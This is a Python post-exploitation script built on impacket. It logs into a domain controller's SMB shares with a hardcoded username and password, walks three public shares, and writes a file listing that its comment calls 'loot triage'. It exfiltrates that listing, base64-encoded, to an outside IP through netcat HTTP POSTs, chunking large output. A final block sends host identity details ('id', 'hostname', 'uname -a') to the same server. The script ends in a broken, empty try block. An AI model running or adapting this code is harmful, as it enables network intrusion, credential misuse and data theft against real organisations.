#!/usr/bin/env python3
# Recursive NAME+SIZE listing of Public_M/S/T on DC .10 (loot triage, no download)
import sys, os, base64, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

OUT = "/tmp/.PUBW.txt"
out = open(OUT, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    out.write(s + b"\n")

TARGETS = [("10.61.10.10", "Public_M"), ("10.61.10.10", "Public_S"), ("10.61.10.10", "Public_T")]
MAXENT = 80000
count = [0]

def walk(c, share, path, depth):
    if depth < 0 or count[0] > MAXENT: return
    try:
        ents = c.listPath(share, path + "\\*")
    except Exception as e:
        w("ERR %s\\%s %s" % (share, path, str(e)[:70])); return
    for e in ents:
        if count[0] > MAXENT: return
        fn = e.get_longname()
        if fn in (".", ".."): continue
        full = path + "\\" + fn
        if e.is_directory():
            w(("  " * (6 - depth)) + "D " + full)
            walk(c, share, full, depth - 1)
        else:
            sz = 0
            try: sz = e.get_filesize()
            except Exception: pass
            w(("  " * (6 - depth)) + "F %d %s" % (sz, full))
        count[0] += 1

for ip, share in TARGETS:
    w("=== %s %s ===" % (ip, share))
    try:
        c = SMBConnection(ip, ip, timeout=10)
        c.login("rez", "!QAZxsw2", "MLT", "", "")
    except Exception as e:
        w("LOGIN_ERR %s" % str(e)[:120]); continue
    walk(c, share, "", 6)
    try: c.logoff()
    except Exception: pass
    w("=== done %s ==" % share)
w("TOTAL=%d" % count[0])
out.close()

S = os.path.getsize(OUT)
def post_file(path, name):
    b = base64.b64encode(open(path, "rb").read()).decode()
    subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: %s\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 300 nc 131.123.43.239 80" % (name, len(b), b), shell=True)
if S < 3000000:
    post_file(OUT, "mel2_pubw")
else:
    subprocess.run("split -b 2800k %s /tmp/.pw_ && for x in /tmp/.pw_*; do b=$(base64 -w0 \"$x\"); printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel2_pubw_part\\r\\nContent-Length: '${#b}'\\r\\n\\r\\n'$b | timeout 90 nc 131.123.43.239 80; done" % OUT, shell=True)
print("PUBW_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

